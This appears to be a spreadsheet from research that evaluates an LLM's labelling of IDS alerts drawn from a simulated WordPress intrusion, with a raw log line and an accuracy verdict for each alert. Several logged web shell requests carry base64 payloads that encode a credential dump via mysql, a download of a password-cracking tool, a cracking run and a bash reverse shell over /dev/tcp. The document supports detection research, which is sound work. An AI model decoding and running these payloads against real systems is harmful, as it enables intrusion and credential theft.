            <text:p>Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to directory without index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Defense Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive config or access control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formation Gathering,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: ”New status code in Apache Access log.”, "New value(s) detected",</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 301 (Moved Permanently) and tool name Apach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Web Server Compromise,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php config file</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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to php config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Web Application Attack,</text:p>
            <text:p>Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name apache and http status code 403</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5" calcext:value-type="float">
            <text:p>5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering,</text:p>
            <text:p>Path Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”, </text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/~logs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Vulnerability Scanning</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to .php file in WordPress themes directory</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Exploitation for Client Execution</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to .php file in WordPress themes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Information Gathering,</text:p>
            <text:p>Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New characters in Apache Access request.”, “New character(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on special characters and http status code 404</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Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/images/social/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and attempted access to WordPress themes directory and sensitive files</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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New status code in Apache Access log.”, “New value(s) detected”,</text:p>
            <text:p>Raw Data: “GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and attempted access to WordPress themes directory and sensitive file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Web Content Discovery</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive file in WordPress themes directory </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3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Information Gathering,</text:p>
            <text:p>Web Attack: Directory Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/.htaccess_”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive file in WordPress themes directory </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Information Gathering,</text:p>
            <text:p>Web Attack: Path Traversal</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/js/admin/admin.php' not found or unable to stat”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to sensitive file in WordPress themes directory </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Web Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell,</text:p>
            <text:p>Command and Control,</text:p>
            <text:p>Exfiltration,</text:p>
            <text:p>Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1 200 507795 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload including keywords such as mysql, select</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Web Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell,</text:p>
            <text:p>Command and Control,</text:p>
            <text:p>Defense Evasion, </text:p>
            <text:p>Inhibit Response Function</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1 200 506717 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload including keywords such as wget, GitHub URL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Correct &amp; expressive</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Shell, </text:p>
            <text:p>Credential Access,</text:p>
            <text:p>Brute Force,</text:p>
            <text:p>Lateral Movement</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, </text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 200 506876 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload including keywords such as wphashcrack, rockyou.txt</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Information Gathering,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 <text:a xlink:href="https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox" xlink:type="simple">https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox</text:a> Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual occurrence frequencies of apache access request and standard user agent</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password Cracking</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Resource Hijacking, </text:p>
            <text:p>Denial of Service, </text:p>
            <text:p>Impact</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual increase in CPU usage</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DNS Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual frequency of DNS queries from different internal Ip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Web Server Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on unusual frequency of apache request methods</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Too generic</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Reverse Shell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command and Control,</text:p>
            <text:p>Web Shell, </text:p>
            <text:p>Indicator Removal on Host</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”</text:p>
            <text:p>Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D HTTP/1.1 200 506717 - python-requests/2.27.1”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on high entropy because of base64 encoded payload including attempted command execution and file deletion</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Account Manipulation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New event type.”, “New path(es) detected”,</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”</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 /dev/pts/1 www-data:phopkin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event type.”, “New path(es) detected”</text:p>
            <text:p>Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name su and pam</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Authentication Bypass</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authenticatio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user_acct parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=USER_ACCT msg=audit(1642511671.635:2442): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:accounting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Credential Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=CRED_ACQ msg=audit(1642511671.663:2443): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:setcred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able:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”,</text:p>
            <text:p>Raw Data: “type=USER_START msg=audit(1642511672.403:2449): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:session_open acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=succes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1">
          <table:table-cell/>
          <table:table-cell table:formula="of:=SUM([.B2:.B47])" office:value-type="float" office:value="96" calcext:value-type="float">
            <text:p>96</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="6"/>
        </table:table-row>
      </table:table>
      <table:table table:name="TP_wazuh_gemini_run5" table:style-name="ta1">
        <table:table-column table:style-name="co25" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co66" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co67" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co68" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co29" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co1" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co65" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>AT</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>#</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Classification</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Attack Line Content</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Description</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Correct Attack Type?</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce4"/>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Valid Accounts – Successful Login,</text:p>
            <text:p>Ini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084, TLS, session=&lt;kj6o/tnVnr3AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful IMAP login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7" calcext:value-type="float">
            <text:p>7</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Network Anomaly, </text:p>
            <text:p>Evasion</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol name TL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Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>TLS Protocol Anomaly,</text:p>
            <text:p>Network Scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “SURICATA TLS invalid record/traffic”, “Suricata: Alert - SURICATA TLS invalid handshake message”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name Suricata and protocol name TLS</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Network Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="3" calcext:value-type="float">
            <text:p>3</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts, </text:p>
            <text:p>Ini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damian.jordan&gt;, method=PLAIN, rip=192.168.128.195, lip=192.168.128.195, mpid=4188, TLS, session=&lt;ZPUbIdrV2L3AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on successful IMAP logins</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Network Scan, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”,</text:p>
            <text:p>Raw Data: “internal-share sshd[28182]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on SSH description indicating scanning behavior</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SSH Scan, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “sshd: insecure connection attempt (scan).”, mitre – technique: “SSH”, id: “T1021.004”, tactic: “Lateral Movement”, </text:p>
            <text:p>Raw Data: “webserver sshd[25473]: Did not receive identification string from [IP] port [port]”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on SSH description indicating scanning behavior</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Scan,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”</text:p>
            <text:p>Raw Data: “GET / HTTP/1.0 403 363 - - ”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 403 and attempted access to root</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Protocol Anomaly,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “First time this IDS alert is generated.”,</text:p>
            <text:p>Raw Data: “SURICATA SMTP invalid reply [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP}”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on protocol name SMTP and invalid reply</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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Directory Traversal Attempt,</text:p>
            <text:p>Web Attack</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on attempted access to default root folder of web server</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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Web Scan,</text:p>
            <text:p>Vulnerability Scan,</text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 3260 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and 403 error cod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Service Scans</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Directory Traversal Attempt,</text:p>
            <text:p>Web Attack,</text:p>
            <text:p>Vulnerability Scan </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Apache: Attempt to access forbidden file or directory.”,</text:p>
            <text:p>Raw Data: “AH01630: client denied by server configuration: /var/www/html/nmaplowercheck1642508249”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name nmap and attempted access to forbidden fil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text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/change-wp-admin-login/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ulnerability Scan, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/clean-image-filenames/ HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classificatio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6" calcext:value-type="float">
            <text:p>6</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/cloudflare/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Vulnerability Scanning,  </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.002”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/constant-contact-forms/ HTTP/1.1 404 146 <text:a xlink:href="https://intranet.price.fox.org/" xlink:type="simple">https://intranet.price.fox.org</text:a> WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classificatio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4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”, </text:p>
            <text:p>Raw Data: “HEAD /wp-content/plugins/regenerate-thumbnails-advanced/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on tool name WPScan and http status code 404</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WPScan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Valid Accounts,  </text:p>
            <text:p>Initial Access</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Dovecot Authentication Success.”, mitre – technique: “Valid Accounts”, id: “T1078”, tactic: “Defense Evasion”, “Persistence”, “Privilege Escalation”, “Initial Access”</text:p>
            <text:p>Raw Data: “taylorcruz-mail dovecot: imap-login: Login: user=&lt;christopher.friedman&gt;, method=PLAIN, rip=192.168.128.195, lip=192.168.128.195, mpid=4382, TLS, session=&lt;8yfdQ9rVLL7AqIDD&gt;”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on IDS mitre classification and successful imap log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Dirb</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="float" office:value="4" calcext:value-type="float">
            <text:p>4</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Web server 400 error code.”,</text:p>
            <text:p>Raw Data: “GET /academics HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and repeated requests from same sourc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1" calcext:value-type="float">
            <text:p>1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning,</text:p>
            <text:p>Information Gathering</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>IDS: “Multiple web server 400 error codes from same source ip.”, mitre – technique: “Vulnerability Scanning”, id: “T1595.022”, tactic: “Reconnaissance”</text:p>
            <text:p>Raw Data: “GET /accountants HTTP/1.1 404 363 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Classification probably based on http status code 404 and repeated requests from same sourc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2" calcext:value-type="float">
            <text:p>2</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Vulnerability Scanning, </text:p>
            <text:p>Reconnaissance</text:p>
          </table:table-cell>
